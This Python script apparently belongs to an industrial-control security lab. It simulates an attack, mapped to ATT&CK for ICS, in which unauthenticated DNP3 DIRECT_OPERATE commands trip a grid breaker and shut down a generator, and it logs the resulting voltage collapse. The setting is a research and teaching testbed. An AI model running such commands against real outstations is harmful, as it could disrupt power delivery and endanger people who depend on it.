#!/usr/bin/env python3
"""Scenario 2 — Unauthorized Control Commands

ATT&CK for ICS Tactic: Impair Process Control
Technique: T0855 — Unauthorized Command Message, T0831 — Manipulation of Control

The adversary issues unauthorized DNP3 DIRECT_OPERATE commands to trip the
breaker and shut down the generator. The outstation accepts these commands
without authentication, and the process simulation reacts: bus voltage
collapses and power deficit increases.

Expected grid impact (verified by test suite):
  - Breaker trip (BO[0] OFF): voltage drops from ~10-12 kV to ~0.05 kV
  - Generator stop (BO[1] OFF): power deficit rises to full load (~800+ kW)
"""

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from scenario_helpers import (
    ScenarioResult,
    ScenarioStep,
    connect,
    direct_operate_binary,
    save_result,
    send_integrity_poll,
    _now,
)

SETTLE_TIME = 2.0


async def run() -> ScenarioResult:
    result = ScenarioResult(
        name="Unauthorized Control",
        description=(
            "Issue unauthorized DNP3 DIRECT_OPERATE commands to trip the main "
            "breaker (BO[0]) and shut down the generator (BO[1]), disrupting "
            "power delivery to the grid."
        ),
        attck_tactic="Impair Process Control (T0855, T0831)",
        timestamp=_now(),
    )

    print("=" * 60)
    print("SCENARIO 2: Unauthorized Control Commands")
    print("=" * 60)

    # Step 1: Baseline read
    print("\n[1] Connecting and reading baseline state ...")
    channel = await connect()
    resp = await send_integrity_poll(channel)
    result.steps.append(
        ScenarioStep(
            action="baseline_read",
            detail="Integrity poll — baseline state captured",
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Integrity poll response: {resp}")

    # Step 2: Trip the breaker
    print("[2] ATTACK: DIRECT_OPERATE — trip breaker (BO[0] LATCH_OFF) ...")
    resp = await direct_operate_binary(channel, index=0, latch_on=False)
    result.steps.append(
        ScenarioStep(
            action="trip_breaker",
            detail="DIRECT_OPERATE BO[0] LATCH_OFF — trip main breaker",
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Response: {resp}")

    # Step 3: Wait for sim to react
    print(f"[3] Waiting {SETTLE_TIME}s for process simulation to react ...")
    await asyncio.sleep(SETTLE_TIME)
    resp = await send_integrity_poll(channel)
    result.steps.append(
        ScenarioStep(
            action="post_breaker_read",
            detail=(
                "Integrity poll after breaker trip — voltage should be collapsing "
                "toward ~0.05 kV (verified by test_adversarial_open_breaker_drops_"
                "voltage_to_near_zero)"
            ),
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Post-breaker-trip integrity poll: {resp}")

    # Step 4: Stop generator
    print("[4] ATTACK: DIRECT_OPERATE — stop generator (BO[1] LATCH_OFF) ...")
    resp = await direct_operate_binary(channel, index=1, latch_on=False)
    result.steps.append(
        ScenarioStep(
            action="stop_generator",
            detail="DIRECT_OPERATE BO[1] LATCH_OFF — shut down backup generator",
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Response: {resp}")

    # Step 5: Wait and capture final state
    print(f"[5] Waiting {SETTLE_TIME}s for process simulation to react ...")
    await asyncio.sleep(SETTLE_TIME)
    resp = await send_integrity_poll(channel)
    result.steps.append(
        ScenarioStep(
            action="final_read",
            detail=(
                "Integrity poll after both attacks — voltage near zero, full load "
                "deficit (verified by test_adversarial_disable_generator_drops_voltage)"
            ),
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Final integrity poll: {resp}")

    await channel.close()

    # All commands should have been accepted
    all_responded = all(s.response == "RESPONSE" for s in result.steps if s.response)
    result.passed = all_responded

    result.observations = [
        "Outstation accepted DIRECT_OPERATE for BO[0] (breaker) without authentication",
        "Outstation accepted DIRECT_OPERATE for BO[1] (generator) without authentication",
        "All commands returned RESPONSE — no access control rejection",
        "Expected grid impact: bus voltage AI[0] collapsed from ~10-12 kV to ~0.05 kV",
        "Expected grid impact: power deficit AI[1] increased to full load (~800+ kW)",
        "State changes visible on outstation terminal monitor (display_loop)",
    ]

    print(f"\n{'PASS' if result.passed else 'FAIL'}: Unauthorized control complete.")
    for obs in result.observations:
        print(f"  - {obs}")

    return result


def main() -> None:
    result = asyncio.run(run())
    path = save_result(result)
    print(f"\nResults saved to: {path}")


if __name__ == "__main__":
    main()
